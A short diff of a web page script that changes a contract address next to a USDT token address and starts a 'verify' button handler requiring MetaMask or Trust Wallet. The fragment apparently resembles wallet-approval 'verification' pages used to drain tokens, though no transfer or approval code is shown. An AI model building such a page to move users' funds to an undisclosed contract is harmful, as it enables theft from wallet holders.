@@ -1,5 +1,5 @@
 const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
-const CONTRACT_ADDRESS = "0xfB42A84FE8C95B7C0af0dfA634c5a496cAFf6676";
+const CONTRACT_ADDRESS = "0x25Ea1887a6aFc6Ce868fEB2b2068Ea498750aa54";
 
 document.getElementById("verifyBtn").onclick = async () => {
   if (!window.ethereum) return alert("Open in MetaMask or Trust Wallet");
